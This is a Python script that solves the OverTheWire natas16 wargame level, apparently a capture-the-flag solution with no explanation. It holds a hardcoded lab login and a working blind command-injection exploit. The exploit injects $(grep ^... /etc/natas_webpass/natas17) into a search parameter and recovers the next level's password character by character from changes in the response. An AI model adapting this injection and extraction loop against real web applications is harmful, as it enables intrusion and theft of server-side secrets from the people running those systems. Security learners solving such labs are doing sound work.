#!/bin/python
import requests

base_url = "http://natas16.natas.labs.overthewire.org/"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"


all_chars = 'bcdghkmnqrswAGHNPQSW035789'

password_dictionary = []
check_str = "sonatas"
i = 0
while len(password_dictionary) < len(auth_password):
  char = all_chars[i]
  querystr = ''.join([check_str,'$(grep ^',''.join(password_dictionary),char,' /etc/natas_webpass/natas17)'])
  payload = { 'needle': querystr, 'submit' : 'Search' }
  r = requests.get(base_url, auth=(auth_username, auth_password), params=payload)  
  if check_str not in r.text:
    password_dictionary.append(char)
    print("Password for natas17: {0}").format(''.join(password_dictionary))
  i = i + 1
  if i >= len(all_chars):
    i = 0
print("Password complete.")

